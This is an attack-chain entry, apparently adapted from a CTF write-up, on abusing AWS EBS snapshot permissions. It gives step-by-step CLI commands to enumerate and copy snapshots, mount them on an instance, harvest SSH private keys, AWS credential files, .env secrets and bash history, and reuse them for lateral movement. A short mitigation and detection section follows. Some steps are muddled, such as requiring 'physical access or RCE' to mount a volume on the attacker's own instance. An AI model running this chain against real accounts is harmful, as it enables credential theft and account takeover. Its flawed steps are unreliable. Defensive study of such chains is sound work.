# AWS EBS Snapshot to SSH Key Extraction to Credential Bypass

## Chain Summary
**Entry Point:** ec2:DescribeSnapshots IAM permission  
**Severity:** High  
**Source:** https://kabinet.gitbook.io/ctf-writeup/2025/thuderdome/pulled-from-the-sky

Exploits IAM permission to enumerate EBS snapshots. Attacker copies snapshot, creates volume, mounts, extracts SSH keys and AWS credentials from the filesystem, then uses harvested credentials for lateral movement or account takeover.

---

## Chain: DescribeSnapshots Enum → Snapshot Copy → Volume Mount → SSH Key Harvest → Lateral Movement

### [1] EBS Snapshot Enumeration
- **Trigger:** IAM identity has `ec2:DescribeSnapshots` permission (often granted via `EC2ReadOnly` or custom policies)
- **Prereq:** AWS CLI access with target identity; target AWS account has accessible snapshots
- **Method:**
  ```bash
  aws ec2 describe-snapshots --owner-ids self --query "Snapshots[*].[SnapshotId,Description,VolumeSize,StartTime]" -o table
  
  # Filter for snapshots with interesting names (prod, backup, etc.)
  aws ec2 describe-snapshots --owner-ids self --filters "Name=description,Values=*prod*" -o table
  ```
- **Yields:** List of snapshot IDs, sizes, timestamps, and descriptions; identify targets containing OS or application data

### [2] Snapshot Copy to Attacker-Controlled Region/Account
- **Trigger:** Target snapshot identified; attacker has `ec2:CopySnapshot` permission (or account misconfiguration allows cross-region copy)
- **Prereq:** Snapshot ID; target AWS region; optionally, attacker-owned AWS account for isolation
- **Method:**
  ```bash
  # Copy snapshot to attacker-controlled region (e.g., us-east-1)
  aws ec2 copy-snapshot \
    --source-region us-west-2 \
    --source-snapshot-id snap-0123456789abcdef0 \
    --destination-region us-east-1 \
    --description "Copied for analysis"
  
  # Poll until copy completes
  aws ec2 describe-snapshots \
    --region us-east-1 \
    --snapshot-ids snap-0987654321fedcba0 \
    --query "Snapshots[0].[State,Progress]"
  ```
- **Yields:** New snapshot copy in attacker-controlled region, ready for volume creation

### [3] Create Volume from Copied Snapshot
- **Trigger:** Snapshot copy complete; attacker has `ec2:CreateVolume` and `ec2:DescribeAvailabilityZones`
- **Prereq:** Copied snapshot ID; attacker-controlled region + AZ; volume size matches snapshot
- **Method:**
  ```bash
  # Create volume in attacker's AZ
  aws ec2 create-volume \
    --region us-east-1 \
    --availability-zone us-east-1a \
    --snapshot-id snap-0987654321fedcba0 \
    --size 20 \
    --tag-specifications 'ResourceType=volume,Tags=[{Key=Name,Value=forensics}]'
  
  # Poll volume state until available
  aws ec2 describe-volumes \
    --region us-east-1 \
    --volume-ids vol-0123456789abcdef0 \
    --query "Volumes[0].State"
  ```
- **Yields:** EBS volume in available state, containing the filesystem from the original snapshot

### [4] Attach Volume to Attacker-Controlled Instance
- **Trigger:** Volume created and available; attacker has running EC2 instance (or launches one)
- **Prereq:** Volume ID; target instance ID; `ec2:AttachVolume` permission; physical access or RCE on instance needed to mount
- **Method:**
  ```bash
  # Attach volume to forensics instance
  aws ec2 attach-volume \
    --region us-east-1 \
    --volume-id vol-0123456789abcdef0 \
    --instance-id i-0123456789abcdef0 \
    --device /dev/sdf
  
  # SSH into instance and mount
  ssh -i ~/.ssh/aws-key.pem ec2-user@<instance-public-ip>
  
  # On the instance:
  sudo mkdir -p /mnt/forensics
  sudo mount /dev/nvme1n1 /mnt/forensics  # NVMe device naming varies; use `lsblk` to find
  ls /mnt/forensics/  # Now have raw filesystem access
  ```
- **Yields:** Mounted filesystem from target EBS volume; direct file-level access to disk contents

### [5] SSH Key Extraction from Filesystem
- **Trigger:** Filesystem mounted; attacker has shell access on instance
- **Prereq:** Shell on forensics instance with mounted volume; read access to filesystem
- **Method:**
  ```bash
  # Navigate to SSH directories
  cd /mnt/forensics/root/.ssh/
  ls -la
  cat authorized_keys  # Get approved SSH public keys for the box
  
  # Extract private key (if stored)
  cat /mnt/forensics/root/.ssh/id_rsa  # Usually not present, but check
  
  # More likely: authorized_keys contains public key for a centralized user
  cat /mnt/forensics/root/.ssh/authorized_keys
  
  # Also check standard Linux user homes
  ls /mnt/forensics/home/
  cat /mnt/forensics/home/<USERNAME>/.ssh/id_rsa  # Private key (if exportable)
  cat /mnt/forensics/home/<USERNAME>/.ssh/authorized_keys
  ```
- **Yields:** SSH public keys (authorized_keys) used to access the original instance; private key if accessible; username mapping

### [6] AWS Credential Harvesting from Disk
- **Trigger:** Filesystem mounted; need persistent AWS access or additional lateral movement creds
- **Prereq:** Shell on forensics instance; read access to mounted filesystem; knowledge of credential storage locations
- **Method:**
  ```bash
  # Check common credential locations
  cat /mnt/forensics/root/.aws/credentials  # AWS CLI creds (potentially stored unencrypted)
  cat /mnt/forensics/root/.aws/config       # AWS config (region, profile)
  
  # Check app directories for hardcoded keys
  find /mnt/forensics/opt /mnt/forensics/var/app -name "*.env" -o -name "config.json" -o -name "secrets.json" 2>/dev/null
  
  # Check bash history for creds or commands
  cat /mnt/forensics/root/.bash_history
  cat /mnt/forensics/home/*/.bash_history
  
  # Check system logs for credential leaks or setup commands
  grep -i "access.key\|secret.key\|password" /mnt/forensics/var/log/auth.log 2>/dev/null
  ```
- **Yields:** AWS access keys, secrets, or SSH private keys; local user credentials; API tokens

### [7] Lateral Movement via Harvested Credentials
- **Trigger:** AWS credentials or SSH keys extracted
- **Prereq:** Valid credentials from step 6; target systems identifiable
- **Method (SSH):**
  ```bash
  # If SSH private key recovered
  ssh -i <extracted_private_key> <username>@<target_host>
  ```

**Method (AWS Credentials):**
  ```bash
  # Configure extracted credentials
  export AWS_ACCESS_KEY_ID="<extracted_key>"
  export AWS_SECRET_ACCESS_KEY="<extracted_secret>"
  
  # Enumerate account and resources
  aws sts get-caller-identity
  aws ec2 describe-instances --region <region>
  aws s3 ls
  aws rds describe-db-instances
  ```
- **Yields:** Authenticated access to other systems or AWS resources; privilege escalation if creds belong to privileged user/role

---

## Mitigation & Detection

**Prevention:**
- Restrict `ec2:DescribeSnapshots` and `ec2:CopySnapshot` to trusted roles only
- Enable **EBS encryption by default** (encryption key remains with original account, snapshot copy cannot be read without re-encryption permission)
- Use **CMK (Customer Master Key)** with strict key policies; cross-region/cross-account copy requires explicit key grant
- Implement **EBS Snapshot Permissions** — restrict snapshots to specific accounts/principals via resource-based policy
- Rotate SSH keys and AWS credentials regularly
- Do NOT store plaintext AWS credentials on disk; use **IAM roles** for EC2 instances
- Use **Secrets Manager** or **Parameter Store** for sensitive data, not filesystem files

**Detection:**
- CloudTrail alerts on `ec2:CopySnapshot`, `ec2:CreateVolume`, `ec2:AttachVolume` from unexpected principals
- Monitor for unusual EBS volume creation or attachment to forensics-type instances
- VPC Flow Logs detecting SSH connections from unexpected sources
- Host-level monitoring for mount operations (`mount` syscalls, `/proc/mounts` changes)
- Secrets Manager or CloudWatch Logs alerting on credential access or exfiltration

---

## References
- AWS EBS Snapshot Permissions: https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ebs-modifying-snapshot-attribute.html
- EBS Encryption: https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/EBSEncryption.html
- IAM Best Practices for EC2: https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/iam-policies-ec2-console.html
